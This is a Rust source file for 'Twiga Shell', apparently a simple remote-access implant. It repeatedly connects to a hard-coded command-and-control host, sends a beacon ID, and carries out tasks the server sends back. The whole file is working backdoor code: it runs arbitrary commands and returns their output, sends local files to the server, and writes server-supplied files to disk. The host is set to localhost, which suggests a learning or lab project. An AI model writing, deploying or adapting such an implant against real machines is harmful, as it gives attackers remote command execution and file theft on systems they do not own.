extern crate rustc_serialize;
extern crate crypto;

use rustc_serialize::Encodable;
use rustc_serialize::json::{self};
use std::fs::File;
use std::io::prelude::*;
use std::fmt;
use std::net::Shutdown;
use std::path::Path;
use std::net::TcpStream;
use std::process::Command;
use std::thread;
use std::time::Duration;

const HOST: &'static str = "localhost:8080";
const SLEEP_SECONDS:u64 = 10;
const ID:u32 = 1001;
const BUFFSIZE:usize = 1024;

/* Twiga Shell
      - Put file - Uploads file from local to remote
      - Get file - Downloads file from remote machine
      - Execute Commands - Executes command and returns stdout, stderr and status code

*/

#[derive(RustcEncodable, RustcDecodable)]
struct CommandExecutionResult {
    stdout: String,
    stderr: String,
    exit_code: i32,
}

#[derive(RustcEncodable, RustcDecodable)]
struct ConnectMessage {
    id: u32,
}

#[derive(RustcEncodable, RustcDecodable)]
struct CommResult {
    id: u32,
    cmd: u32,
    output: String,
}

#[derive(RustcDecodable, RustcEncodable)]
struct CommTask {
    id: u32,
    cmd: u32,
    parameters: String,
}

fn connect_message() -> String{
    let connect_data = ConnectMessage {
        id: ID,
    };
    return json::encode(&connect_data).unwrap();
}

fn parse_tasking(message: &str) -> Vec<CommTask> {
    let output: Vec<CommTask> = json::decode(message).expect("Data is not JSON");
    return output;
}

fn get_file(command: &str, stream: &mut TcpStream) -> String {
    /* Retrieve file from remote host.
            -- Raw string from the tasking
            -- TCP stream connecting to the server
    */
    let split = command.split(" ");
    // First part of string is the command
    let mut args = vec![];
    for arg in split {
       args.push(arg.to_string());
    }
    if args.len() < 1 {
        return String::from("Missing Parameters");
    } else if args.len() > 1 {
        return String::from("Too many parameters");
    }
    let l_path = Path::new(&args[0]);
    if !l_path.is_file() {
        return String::from("File does not exist");
    }
    let mut f = match File::open(l_path) {
        Ok(f) => f,
        Err(_) => return String::from("File did not open")
    };
    let mut read_bytes = BUFFSIZE;
    let mut total_bytes = 0;
    while read_bytes == BUFFSIZE {
        // Create a zeroized buffer per read
        let mut file_buffer:[u8; BUFFSIZE] = [0; BUFFSIZE];
        read_bytes = match f.read(&mut file_buffer) {
            Ok(bytes) => bytes,
            Err(_) => return String::from("Could not read file")
        };
        total_bytes += read_bytes;
        let sent_bytes:usize = match stream.write(&file_buffer) {
            Ok(bytes) => bytes,
            Err(_) => return String::from("Could not write to TcpStream")
        };
        if sent_bytes != BUFFSIZE {
            panic!("Did not send entire buffer only send {}", sent_bytes);
        }
    }
    return format_args!("File Transfered, sent {} bytes", total_bytes).to_string();
}

fn put_file(command: &str, stream: &mut TcpStream) -> String {
    /* Retrieve file from remote host.
            -- Raw string from the tasking
            -- TCP stream connecting to the server
    */
    let split = command.split(" ");
    // First part of string is the command
    let mut args = vec![];
    for arg in split {
       args.push(arg.to_string());
    }
    if args.len() < 1 {
        return String::from("Missing Parameters");
    } else if args.len() > 1 {
        return String::from("Too many parameters");
    }
    let l_path = Path::new(&args[0]);
    let mut f = match File::create(l_path, ) {
        Ok(f) => f,
        Err(_) => return String::from("File did not open for write")
    };
    let mut read_bytes = BUFFSIZE;
    let mut total_bytes = 0;
    while read_bytes == BUFFSIZE {
        // Create a zeroize a buffer per read
        let mut file_buffer:[u8; BUFFSIZE] = [0; BUFFSIZE];
        read_bytes = match stream.read(&mut file_buffer) {
            Ok(bytes) => bytes,
            Err(_) => return String::from("Could not read from TcpStream")
        };
        let (data, _) = file_buffer.split_at(read_bytes);
        let written_bytes:usize = match f.write(&data) {
            Ok(bytes) => bytes,
            Err(_) => return String::from("Could not write file")
        };
        total_bytes += written_bytes;
    }
    return format_args!("File Transfered, wrote {} bytes to {:?}", total_bytes, l_path).to_string();
}

fn execute_command(command: &str) -> String {
    let mut split = command.split(" ");
    // First part of string is the command
    let cmd = split.next().expect("No command in the string");
    // Parse the rest of the args into an array
    let mut args = vec![];
    for arg in split {
       args.push(arg.to_string());
    }
    // Run the command and get the results
    let child = match Command::new(cmd)
                            .args(&args[..])
                            .output() {
                                Ok(child) => child,
                                Err(_) => return String::from("Failed to start process")
                            };
    let command_output = CommandExecutionResult {
        stdout    : String::from_utf8(child.stdout).unwrap(),
        stderr    : String::from_utf8(child.stderr).unwrap(),
        exit_code : child.status.code().unwrap()
    };
    return json::encode(&command_output).unwrap();
}

fn send_message(stream: &mut TcpStream, message: String){
    match stream.write(message.as_bytes()) {
        Ok(_)  => println!("Sent Data"),
        Err(_) => println!("Error on data send"),
    };
}

fn recv_message(stream: &mut TcpStream) -> String {
    let mut length: [u8; 4] = [0; 4];
    // Read the total length of the tasking message
    stream.read_exact(& mut length).unwrap();
    let mut len:u32 = 0;
    for value in length.iter() {
        len = len.wrapping_shl(8) + *value as u32;
    }
    let mut buff = vec![0; len as usize] ;
    let mut buff_array:&mut [u8] = &mut buff[..];
    stream.read_exact(buff_array).expect("Could not read from TCPstream ");
    let mut data_buff = vec![];
    data_buff.extend_from_slice(buff_array);
    return String::from_utf8(data_buff).unwrap();
}

fn main() {
    'main_loop: loop {
        println!("Connecting to {}", HOST);
        let mut stream = match TcpStream::connect(HOST) {
            Ok(stream) => stream,
            Err(_) => {
                // Cannot connect so wait and try again
                thread::sleep(Duration::new(SLEEP_SECONDS, 0));
                continue 'main_loop;
            },
        };
        // Send Connect Message
        let message = connect_message();
        send_message(&mut stream, message);
        println!("Sent Connect Message to {}", HOST);

        let message = recv_message(&mut stream);
        println!("Received Task Message from {}", HOST);
        let tasks: Vec<CommTask> = parse_tasking(&message);
        // Execute the tasking
        for task in tasks {
            let output:String;
            if task.id == ID {
                output = match task.cmd {
                    1000 => execute_command(&task.parameters),
                    1001 => get_file(&task.parameters, &mut stream),
                    1002 => put_file(&task.parameters, &mut stream),
                    _    => String::from("Unknown Command number")
                };
            } else {
                output = fmt::format(format_args!("Queued command for {}", task.id));
                // Not really queuing here, but sometime in the future
            }
            // Create the return Struct to relay status
            let command_output = CommResult {
                cmd: task.cmd,
                id: 1001u32,
                output: output
            };
            let output = json::encode(&command_output).unwrap();
            println!("{} {}\n",output.len(), output);
            let _ = stream.write_fmt(format_args!("{}\n",output));
            println!("Sent Task Response to {}", HOST);
        }

        let _ = stream.shutdown(Shutdown::Both).map_err(|err| panic!(err.to_string()));
        thread::sleep(Duration::new(SLEEP_SECONDS, 0));
    }
}
